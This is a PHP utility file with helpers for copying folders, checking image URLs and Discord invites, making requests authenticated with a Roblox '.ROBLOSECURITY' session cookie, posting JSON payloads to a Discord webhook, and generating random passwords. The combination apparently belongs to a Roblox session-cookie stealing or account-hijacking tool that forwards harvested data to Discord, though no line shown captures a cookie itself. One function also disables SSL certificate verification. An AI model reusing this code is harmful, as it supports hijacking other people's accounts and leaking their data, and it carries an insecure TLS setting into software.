<?php
function copyFolder($src, $dst) {
    $dir = opendir($src);
    @mkdir($dst);
    while (($file = readdir($dir)) !== false) {
        if ($file != '.' && $file != '..') {
            $srcFile = "$src/$file";
            $dstFile = "$dst/$file";
            if (is_dir($srcFile)) {
                copyFolder($srcFile, $dstFile);
            } else {
                copy($srcFile, $dstFile);
            }
        }
    }
    closedir($dir);
    return true;  
}

function isImageUrl($url) {
    $imageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
    $pathInfo = pathinfo(parse_url($url, PHP_URL_PATH));

    if (!isset($pathInfo['extension']) || !in_array(strtolower($pathInfo['extension']), $imageExtensions)) {
        return false;
    }

    $headers = @get_headers($url, 1);
    if ($headers && isset($headers['Content-Type'])) {
        $contentType = is_array($headers['Content-Type']) ? $headers['Content-Type'][0] : $headers['Content-Type'];
        return strpos($contentType, 'image/') === 0;
    }

    return false;
}

function isValidDiscordInvite($inviteCode) {
    $url = "https://discord.com/api/v9/invites/$inviteCode?with_counts=true&with_expiration=true&with_permissions=true";
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode !== 200 || strpos($response, 'Unknown Invite') !== false) {
        return false;
    }
    return true;
}

function make_curl_request($url, $cookie = "") {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Cookie: .ROBLOSECURITY=$cookie",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    ]);

    $response = curl_exec($ch);
    $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ['response' => $response, 'http_status' => $http_status];
}

//send discord
function send_to_discord($webhook_url, $payload) {
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload, JSON_UNESCAPED_UNICODE));
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function generateRandomPassword($length = 35) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $password = '';
    for ($i = 0; $i < $length; $i++) {
        $password .= $characters[random_int(0, strlen($characters) - 1)];
    }
    return $password;
}